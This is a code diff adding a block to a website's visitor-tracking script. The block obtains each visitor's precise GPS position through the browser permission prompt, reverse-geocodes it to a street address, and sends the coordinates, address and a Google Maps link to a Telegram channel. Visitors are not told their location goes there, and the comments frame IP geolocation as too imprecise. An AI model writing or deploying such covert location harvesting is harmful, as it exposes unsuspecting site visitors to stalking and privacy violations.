@@ -287,7 +287,68 @@
     if (!session.visitSent) sendVisitNotification(null);
   }, 3000);
 
-  /* ─── SCROLL DEPTH TRACKING ───────────────────────────────── */
+  /* ─── EXACT GPS LOCATION (browser permission) ──────────────────
+     IP geolocation is always city/ISP-level (~5-60 km off).
+     The ONLY way to get exact coordinates is the browser Geolocation
+     API. Browser will show a one-time permission prompt to the visitor.
+     If granted  → fires a second Telegram message with:
+       • Exact lat/lon (6 decimal places ≈ ±0.1m precision)
+       • Accuracy radius in metres
+       • Reverse-geocoded street address (OpenStreetMap Nominatim)
+       • Clickable Google Maps pin at exact location
+     If denied   → silently ignored; IP-based message already sent.
+  ──────────────────────────────────────────────────────────────── */
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        var lat      = pos.coords.latitude.toFixed(6);
+        var lon      = pos.coords.longitude.toFixed(6);
+        var accuracy = Math.round(pos.coords.accuracy); // metres
+        var mapsUrl  = "https://www.google.com/maps?q=" + lat + "," + lon;
+
+        // Reverse geocode via OpenStreetMap Nominatim (free, no key)
+        fetch(
+          "https://nominatim.openstreetmap.org/reverse?lat=" + lat
+          + "&lon=" + lon + "&format=json",
+          { headers: { "Accept-Language": "en" } }
+        )
+        .then(function(r) { return r.json(); })
+        .then(function(place) {
+          var addr = place.display_name || (lat + ", " + lon);
+          // Shorten: keep road, suburb, city, state, country
+          var a = place.address || {};
+          var parts = [
+            a.road || a.pedestrian || a.footway,
+            a.suburb || a.neighbourhood || a.quarter,
+            a.city || a.town || a.village || a.county,
+            a.state,
+            a.country
+          ].filter(Boolean);
+          var shortAddr = parts.length ? parts.join(", ") : addr;
+
+          sendExactLocation(lat, lon, accuracy, shortAddr, mapsUrl);
+        })
+        .catch(function() {
+          // Nominatim failed — send coords only
+          sendExactLocation(lat, lon, accuracy, null, mapsUrl);
+        });
+      },
+      function() { /* permission denied or unavailable — no action */ },
+      { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
+    );
+  }
+
+  function sendExactLocation(lat, lon, accuracy, address, mapsUrl) {
+    var msg = "EXACT GPS LOCATION\n";
+    msg += "================================\n";
+    if (address) msg += "Address: " + address + "\n";
+    msg += "Coords: " + lat + ", " + lon + "\n";
+    msg += "Accuracy: +-" + accuracy + " metres\n";
+    msg += "Maps: " + mapsUrl;
+    tg(msg);
+  }
+
+
   var THRESHOLDS = [25, 50, 75, 100];
   var scrollTicking = false;
 
